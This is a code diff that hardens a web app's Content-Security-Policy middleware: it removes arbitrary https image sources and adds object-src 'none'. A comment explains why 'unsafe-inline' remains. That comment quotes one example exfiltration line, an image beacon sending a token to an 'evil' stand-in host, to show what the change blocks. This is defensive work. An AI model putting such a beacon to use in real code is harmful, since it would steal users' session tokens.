@@ -1867,14 +1867,23 @@ app.add_middleware(_StaticCacheMiddleware)
 
 # Security headers on every response
 class _SecurityHeadersMiddleware(BaseHTTPMiddleware):
+    # NOTE on script-src 'unsafe-inline': the app currently relies on ~1000+ inline
+    # event handlers (onclick=, …) and inline <script> blocks, so 'unsafe-inline'
+    # cannot be removed without migrating all of them to addEventListener/delegation
+    # (a large, separate effort). Until then we harden the *exfiltration* side so an
+    # injected script cannot ship a stolen token out: connect-src is locked to known
+    # APIs (blocks fetch/XHR/beacon exfil), img-src no longer allows arbitrary https:
+    # (blocks `new Image().src='https://evil/?t='+token` beacons), and object-src
+    # 'none' kills <object>/<embed> script vectors.
     _CSP = (
         "default-src 'self'; "
         "script-src 'self' 'unsafe-inline' https://plausible.io "
         "  https://js.sentry-cdn.com https://browser.sentry-cdn.com; "
         "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
         "font-src 'self' https://fonts.gstatic.com; "
-        "img-src 'self' data: blob: https:; "
+        "img-src 'self' data: blob:; "
         "media-src 'self' blob:; "
+        "object-src 'none'; "
         "connect-src 'self' https://plausible.io https://o*.ingest.sentry.io "
         "  https://api.paystack.co https://api.flutterwave.com https://api.withmono.com "
         "  https://accounts.google.com https://api.github.com; "
